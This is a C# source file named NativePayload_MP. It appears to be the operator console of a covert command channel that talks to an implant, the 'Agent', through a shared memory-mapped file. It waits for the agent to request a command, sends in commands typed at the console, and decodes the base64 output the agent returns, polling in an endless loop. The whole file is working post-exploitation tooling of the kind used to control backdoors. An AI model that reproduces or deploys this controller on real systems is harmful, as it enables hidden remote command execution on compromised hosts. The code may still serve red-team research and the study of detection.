using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace NativePayload_MP
{
    class Program
    {
        static void Main(string[] args)
        {
            /// this is old version
            Console.ForegroundColor = ConsoleColor.Gray;

            try
            {
                string yourcmd = "";
                bool getcmdagain = false;
                string oldcmd = "";
                string s = "";
                ops:
                Console.ForegroundColor = ConsoleColor.Gray;

                using (MemoryMappedFile mmf2 = MemoryMappedFile.OpenExisting("ClientMapper"))
                {
                    Mutex mutex = Mutex.OpenExisting("_ClientMapper");
                    using (MemoryMappedViewStream stream = mmf2.CreateViewStream())
                    {
                        Console.ForegroundColor = ConsoleColor.DarkYellow;

                        Console.WriteLine(DateTime.Now.ToString() + "[!] Searching in-Memory... for [Agent]");
                        Console.ForegroundColor = ConsoleColor.Green;

                        BinaryReader reader = new BinaryReader(stream);

                        s = reader.ReadString();

                        Console.WriteLine(DateTime.Now.ToString()+ " " + s);
                        Console.ForegroundColor = ConsoleColor.Gray;

                    }
                    // mutex.ReleaseMutex();
                    if (args.Length > 0 && args[0] == "dbg")
                    {
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[dbg] => " + s);
                        Console.ForegroundColor = ConsoleColor.Gray;
                    }
                    if (s.Contains("@getcmd=") || getcmdagain )
                    {
                        Console.ForegroundColor = ConsoleColor.DarkGray;
                        Console.WriteLine("[>] Set Command and press enter");
                        Console.ForegroundColor = ConsoleColor.Blue;
                        yourcmd = Console.ReadLine();
                        Console.ForegroundColor = ConsoleColor.DarkGray;
                        Console.WriteLine("[>] Sending Command to Memory");
                        using (MemoryMappedViewStream streamw = mmf2.CreateViewStream())
                        {
                            Console.ForegroundColor = ConsoleColor.DarkYellow;
                            BinaryWriter writer = new BinaryWriter(streamw);
                            writer.Write("[!] " + DateTime.Now.ToString() + " NativePayload_MP.CS.cmd =>" + yourcmd);
                        }
                        // mutex.ReleaseMutex();
                        getcmdagain = false;
                        oldcmd = yourcmd;
                    }



                    if (s.Contains("cmd output => ") || getcmdagain == false && oldcmd != yourcmd )
                    {
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("[>] {0} Command Output Downloaded from Memory", DateTime.Now.ToString());
                        Console.WriteLine("========================================");
                        Console.ForegroundColor = ConsoleColor.Green;
                        //strOutput = Convert.ToBase64String(UnicodeEncoding.UTF8.GetBytes(outputs.StandardOutput.ReadToEnd()));
                        string temp = s.Split('>')[1];
                        string final = UTF8Encoding.UTF8.GetString(Convert.FromBase64String(temp));
                        //Console.WriteLine(s.Split('>')[1]);
                        Console.WriteLine(final);
                        Console.ForegroundColor = ConsoleColor.White;
                        Console.WriteLine("========================================");
                        getcmdagain = true;
                        Console.ForegroundColor = ConsoleColor.Gray;

                    }
                    Console.ForegroundColor = ConsoleColor.Gray;


                    //mutex.WaitOne();
                    Thread.Sleep(6555);
                    // Console.ReadKey();

                   // mutex.ReleaseMutex();
                    goto ops;

                }
            }
            catch (Exception)
            {

                //throw;
            }

            Console.ReadKey(); 
       
                    }
    }
}
